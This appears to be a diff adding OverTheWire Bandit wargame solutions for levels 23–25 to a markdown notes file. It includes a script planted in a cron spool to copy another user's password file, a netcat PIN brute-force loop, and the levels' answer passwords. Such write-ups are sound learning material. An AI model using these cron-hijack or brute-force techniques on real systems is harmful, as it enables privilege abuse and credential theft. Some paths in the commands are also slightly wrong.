@@ -278,4 +278,61 @@ ls -la /etc/cron.d
 cat /etc/cron.d/cronjob_bandit24
 
 cat /usr/bin/cronjob_bandit24.sh
+
+mktemp -d
+
+cd /tmp/tmp.XYZ
+
+nano bandit24_pass.sh
+
+    #!/bin/bash
+    cat /etc/bandit_pass/bandit24 > tmp/tmp.XYZ/password
+
+chmod +rx bandit24_pass.sh
+
+chmod 777 tmp/tmp.XYZ
+
+touch password
+
+chmod +rwx password
+
+cp bandit24_pass.sh /var/spool/bandit24/foo/
+
+echo I am user bandit24 | md5sum | cut -d ' ' -f 1
+
+cat /tmp/ABC123
+```
+
+### Level 24
+```gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8```
+
+```
+nc localhost 30002
+
+mktemp -d
+
+cd /tmp/tmp.yZX8doPhBV
+
+nano brute_force_pin.sh
+
+    #!/bin/bash
+
+    for i in {0000..9999}
+    do
+            echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> possibilities.txt
+    done
+
+    cat possibilities.txt | nc localhost 30002 > result.txt
+
+chmod +x brute_force_pin.sh
+
+./brute_force_pin.sh
+
+sort result.txt | grep -v "Wrong!"
+```
+
+### Level 25
+```iCi86ttT4KSNe1armKiwbQNmB3YJP3q4```
+
+```
 ```
